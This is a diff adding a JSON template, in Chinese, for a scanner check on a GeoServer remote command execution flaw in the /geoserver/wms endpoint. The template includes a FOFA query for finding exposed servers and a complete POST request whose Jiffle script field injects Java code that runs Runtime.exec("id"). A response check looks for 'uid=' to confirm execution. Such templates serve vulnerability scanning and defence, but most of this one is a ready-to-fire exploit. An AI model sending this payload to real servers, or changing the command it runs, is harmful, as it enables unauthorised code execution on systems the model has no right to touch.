@@ -1,0 +1,41 @@
+{
+  "product": "GeoServer",
+  "vul_name": "GeoServer /geoserver/wms接口远程命令执行",
+  "type": "命令执行",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "GeoServer是OGC Web服务器规范的J2EE实现，利用GeoServer可以方便地发布地图数据，允许用户对要素数据进行更新、删除、插入操作，通过GeoServer可以比较容易地在用户之间迅速共享空间地理信息。GeoServer /geoserver/wms接口存在远程命令执行漏洞",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"GeoServer\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s/Y_wnlUoAPrVZe8Q4xhJuLQ",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/geoserver/wms",
+      "header": {
+        "Content-Type": "application/xml"
+      },
+      "data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <wps:Execute version=\"1.0.0\" service=\"WPS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://www.opengis.net/wps/1.0.0\" xmlns:wfs=\"http://www.opengis.net/wfs\" xmlns:wps=\"http://www.opengis.net/wps/1.0.0\" xmlns:ows=\"http://www.opengis.net/ows/1.1\" xmlns:gml=\"http://www.opengis.net/gml\" xmlns:ogc=\"http://www.opengis.net/ogc\" xmlns:wcs=\"http://www.opengis.net/wcs/1.1.1\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xsi:schemaLocation=\"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\">\n    <ows:Identifier>ras:Jiffle</ows:Identifier>\n    <wps:DataInputs>\n      <wps:Input>\n        <ows:Identifier>coverage</ows:Identifier>\n        <wps:Data>\n          <wps:ComplexData mimeType=\"application/arcgrid\"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>\n        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>script</ows:Identifier>\n        <wps:Data>\n          <wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream())); String line = null; String allLines = \" - \"; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>\n        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>outputType</ows:Identifier>\n        <wps:Data>\n          <wps:LiteralData>DOUBLE</wps:LiteralData>\n        </wps:Data>\n      </wps:Input>\n    </wps:DataInputs>\n    <wps:ResponseForm>\n      <wps:RawDataOutput mimeType=\"image/tiff\">\n        <ows:Identifier>result</ows:Identifier>\n      </wps:RawDataOutput>\n    </wps:ResponseForm>\n  </wps:Execute>"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "uid="
+        }
+      ]
+    }
+  }
+}
